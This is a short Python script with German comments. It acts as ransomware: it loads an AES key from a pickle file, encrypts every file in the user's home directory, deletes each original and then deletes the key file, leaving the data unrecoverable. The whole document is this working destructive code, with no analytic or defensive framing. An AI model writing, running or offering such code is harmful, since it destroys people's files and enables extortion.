from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os
import subprocess
import pickle

def load_static_key():
    # Lade den gespeicherten statischen Schlüssel
    with open("static_key.pickle", "rb") as f:
        static_key = pickle.load(f)
    return static_key

def encrypt_and_delete_files(static_key):
    home_directory = os.path.expanduser("~")

    for root, directories, files in os.walk(home_directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            try:
                with open(file_path, 'rb') as f:
                    plain_text = f.read()

                cipher = AES.new(static_key, AES.MODE_CBC)
                cipher_text = cipher.iv + cipher.encrypt(pad(plain_text, AES.block_size))

                encrypted_file_path = file_path + '.encrypted'
                with open(encrypted_file_path, 'wb') as f:
                    f.write(cipher_text)

                # Lösche die Originaldatei
                os.remove(file_path)
            except Exception as e:
                print(f"Fehler beim Verschlüsseln von {file_path}: {e}")

# Laden des statischen Schlüssels
static_key = load_static_key()

# Verschlüsseln und Löschen der Dateien
encrypt_and_delete_files(static_key)

# Lösche den gespeicherten statischen Schlüssel
os.remove("static_key.pickle")
